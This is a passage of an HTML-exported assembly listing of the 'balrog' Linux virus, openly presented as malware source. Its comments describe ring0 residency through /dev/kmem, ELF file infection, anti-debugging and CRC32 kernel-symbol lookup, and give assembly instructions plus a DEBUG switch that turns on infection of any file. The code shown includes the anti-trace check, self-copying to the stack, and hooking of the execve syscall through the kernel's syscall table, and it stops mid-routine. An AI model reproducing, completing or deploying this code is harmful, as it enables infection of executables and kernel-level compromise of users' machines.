<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                                       _</span><span class="sc0">
</span><span class="sc1">;                                                              _( (~\
;       _ _                        /    hAckniX               ( \&gt; &gt; \
;   -/~/ / ~\                     :;   PienSteVo    \       _  &gt; /(~\/</span><span class="sc0">
</span><span class="sc1">;  || | | /\ ;\                   |l      _____     |;     ( \/    &gt; &gt;</span><span class="sc0">
</span><span class="sc1">;  _\\)\)\)/ ;;;                  `8o __-~     ~\   d|      \      //</span><span class="sc0">
</span><span class="sc1">; ///(())(__/~;;\                  "88p;.  -. _\_;.oP        (_._/ /</span><span class="sc0">
</span><span class="sc1">;(((__   __ \\   \                  `&gt;,% (\  (\./)8"         ;:'  i</span><span class="sc0">
</span><span class="sc1">;)))--`.'-- (( ;,8 \               ,;%%%:  ./V^^^V'          ;.   ;.</span><span class="sc0">
</span><span class="sc1">;((\   |   /)) .,88  `: ..,,;;;;,-::::::'_::\   ||\         ;[8:   ;</span><span class="sc0">
</span><span class="sc1">; )|  ~-~  |(|(888; ..``'::::8888oooooo.  :\`^^^/,,~--._    |88::  |</span><span class="sc0">
</span><span class="sc1">; |\ -===- /|  \8;; ``:.      oo.8888888888:`((( o.ooo8888Oo;:;:'  |</span><span class="sc0">
</span><span class="sc1">; |_~-___-~_|   `-\.   `        `o`88888888b` )) 888b88888P""'     ;</span><span class="sc0">
</span><span class="sc1">; ; ~~~~;~~         "`--_`.       b`888888888;(.,"888b888"  ..::;-'</span><span class="sc0">
</span><span class="sc1">;   ;      ;              ~"-....  b`8888888:::::.`8888. .:;;;''</span><span class="sc0">
</span><span class="sc1">;      ;    ;                 `:::. `:::OOO:::::::.`OO' ;;;''</span><span class="sc0">
</span><span class="sc1">; :       ;                     `.      "``::::::''    .'</span><span class="sc0">
</span><span class="sc1">;    ;                           `.   \_              /</span><span class="sc0">
</span><span class="sc1">;  ;       ;                       +:   ~~--  `:'  -';</span><span class="sc0">
</span><span class="sc1">;                                   `:         : .::/</span><span class="sc0">
</span><span class="sc1">;      ;   How'd ya like that?      ;;+_  :::. :..;;;</span><span class="sc0">
</span><span class="sc1">;                                   ;;;;;;,;;;;;;;;,;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; this is the first version of balrog resident virus</span><span class="sc0">
</span><span class="sc1">; the resident mecanism is inspired from the (wonderful) stoag virus</span><span class="sc0">
</span><span class="sc1">; I played with kernel symbol only for demonstrating the use</span><span class="sc0">
</span><span class="sc1">; of exported kernel symbolz</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; the total size of the virus is not optimized</span><span class="sc0">
</span><span class="sc1">; I prefer write a source wich is more readable</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   features of this virus is:</span><span class="sc0">
</span><span class="sc1">;       - resident in ring0 mode ( accessing by /dev/kmem )</span><span class="sc0">
</span><span class="sc1">;       - using exported kernel symboles</span><span class="sc0">
</span><span class="sc1">;       - retrieving kernel API with crc32</span><span class="sc0">
</span><span class="sc1">;       - elf infection without tempory file</span><span class="sc0">
</span><span class="sc1">;       - antidebugging ( detecting if task is traced )</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; to Assemble it:</span><span class="sc0">
</span><span class="sc1">;   nasm -f elf balrog.asm</span><span class="sc0">
</span><span class="sc1">;   ld -o balrog balrog.o</span><span class="sc0">

</span><span class="sc9">bits</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">
</span><span class="sc9">global</span><span class="sc0"> </span><span class="sc5">_start</span><span class="sc0">

</span><span class="sc9">section</span><span class="sc0"> </span><span class="sc10">.text</span><span class="sc0">

    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_exit</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_read</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_write</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_open</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_close</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_execve</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_seek</span><span class="sc0"> </span><span class="sc2">19</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_ptrace</span><span class="sc0"> </span><span class="sc2">26</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_brk</span><span class="sc0"> </span><span class="sc2">45</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_sethostname</span><span class="sc0"> </span><span class="sc2">74</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_munmap</span><span class="sc0"> </span><span class="sc2">91</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_uname</span><span class="sc0"> </span><span class="sc2">109</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_deprotect</span><span class="sc0"> </span><span class="sc2">125</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_get_kernel_syms</span><span class="sc0"> </span><span class="sc2">130</span><span class="sc0">
    </span><span class="sc1">; if u want to infect any file, put DEBUG to 0</span><span class="sc0">
    </span><span class="sc1">; for demonstration only debug = 1</span><span class="sc0">
    </span><span class="sc1">; then files to infect are filtred by sz_filter</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">___BREAK___</span><span class="sc0"> </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc1">;crc32 calculation</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">CRC32_</span><span class="sc0"> </span><span class="sc2">0C1A7F39Ah</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">CRC32_init</span><span class="sc0"> </span><span class="sc2">09C3B248Eh</span><span class="sc0">

    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">OF</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">      </span><span class="sc1">; offset in user space</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">KOF</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">delta_ring0</span><span class="sc0">   </span><span class="sc1">; offset in kernel space</span><span class="sc0">

</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; Some CODEZZ...                               ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc5">_start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc1">; anti debugging trick</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_ptrace</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFF000h</span><span class="sc0"> </span><span class="sc1">; is any tracer ?</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">fuck_</span><span class="sc0">  </span><span class="sc1">; yeah then fuck</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; get argv[0]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta</span><span class="sc0">
      </span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc1">; copy the virus body in the stack and exectute it!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">end_of_host</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">begin_host</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">begin_host</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

      </span><span class="sc5">begin_host</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFF000h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4000h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_deprotect</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_open</span><span class="sc0"> </span><span class="sc1">; open host file</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xfffff000</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">fuck_</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; (0) save host file descriptor</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0666h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_execve</span><span class="sc0">     </span><span class="sc1">; check if already resident</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0667h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">RestoreHostCode</span><span class="sc0">     </span><span class="sc1">; if already infected call host code</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GoResident</span><span class="sc0">      </span><span class="sc1">; else call GoResident routine...</span><span class="sc0">
      </span><span class="sc5">RestoreHostCode</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; (0) restore host file descriptor</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0b9h</span><span class="sc0">            </span><span class="sc1">; mov ecx, xxxxxxxx</span><span class="sc0">
    </span><span class="sc5">bytes2seek</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lSeek</span><span class="sc0">           </span><span class="sc1">; lSeek to host code in the end of host</span><span class="sc0">
                        </span><span class="sc1">; file</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; if eax=0 : first generation</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">go_on</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">first_generation</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc5">go_on</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">_start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_end</span><span class="sc4">-</span><span class="sc5">_start</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_read</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_close</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">end_of_host</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">begin_host</span><span class="sc0">   </span><span class="sc1">; free virus memory</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">; write entrypoint</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">               </span><span class="sc1">; restore all registers</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; go to host code !</span><span class="sc0">

      </span><span class="sc5">fuck_</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_exit</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; NAME   * GoResident                              ;</span><span class="sc0">
</span><span class="sc1">; DESCR  * This is the main routine of the balrog virus            ;</span><span class="sc0">
</span><span class="sc1">;        * the execve call is hooked in ring0 area                         ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; INPUT  *                                 ;</span><span class="sc0">
</span><span class="sc1">; OUTPUT *                                 ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc5">GoResident</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_get_kernel_syms</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; save in ecx nb of sym</span><span class="sc0">

    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc0">        </span><span class="sc1">; eax*64</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;allocate some space for symbolz</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KernelSym</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KernelSym</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_get_kernel_syms</span><span class="sc0"> </span><span class="sc1">; get symbol table to memory pointed</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">          </span><span class="sc1">; by ebx</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">@@CRCZ</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">@@Offsetz</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAPIs</span><span class="sc0">         </span><span class="sc1">; get all kernel api and symz !</span><span class="sc0">

    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; restore stack...</span><span class="sc0">

    </span><span class="sc1">; ---- open /dev/kmem for allocate kernel space ---- ;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc1">;rw</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">DevKmemFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_open</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0xFFFFF000</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">eof_res</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">_sys_call_table</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SYS_execve</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">ApiSysExecve</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetSyscall</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SYS_sethostname</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">ApiSysSethostname</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetSyscall</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SYS_brk</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">ApiSysBrk</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetSyscall</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SYS_munmap</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">ApiSysMunmap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetSyscall</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SYS_ptrace</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">ApiSysPtrace</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetSyscall</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">ApiSysSethostname</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lSeek</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EndOfAllocateKernelSpace</span><span class="sc4">-</span><span class="sc5">AllocateKernelSpace</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc1">;reserve memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_read</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

